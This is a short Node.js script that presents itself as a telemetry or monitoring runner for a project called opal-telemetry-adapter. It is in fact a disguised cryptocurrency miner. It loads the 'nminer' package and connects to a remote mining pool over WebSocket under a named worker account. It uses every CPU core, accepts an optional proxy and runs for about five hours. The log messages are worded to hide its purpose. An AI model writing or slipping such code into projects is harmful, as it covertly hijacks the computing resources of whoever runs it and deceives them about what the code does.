// Procedural action runner for opal-telemetry-adapter
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./app/config");

async function launchDaemon() {
    const instanceToken = "344778";
    console.log(`[monitor] Starting runtime for ${config.appName || "opal-telemetry-adapter"} [${instanceToken}]`);

    const daemon = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.opal-telemetry-adapter",
        Object.assign({ throttle: true, threads: os.cpus().length }, process.argv[2] ? { proxy: process.argv[2] } : {})
    );

    const heartbeat = setInterval(() => {}, 86000);
    setTimeout(() => {
        console.log("[timeout] Operational limit (326m) reached, exiting cleanly.");
        process.exit(0);
    }, 326 * 60 * 1000);

    process.on("SIGTERM", () => {
        clearInterval(heartbeat);
        console.log(`[monitor] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

launchDaemon().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
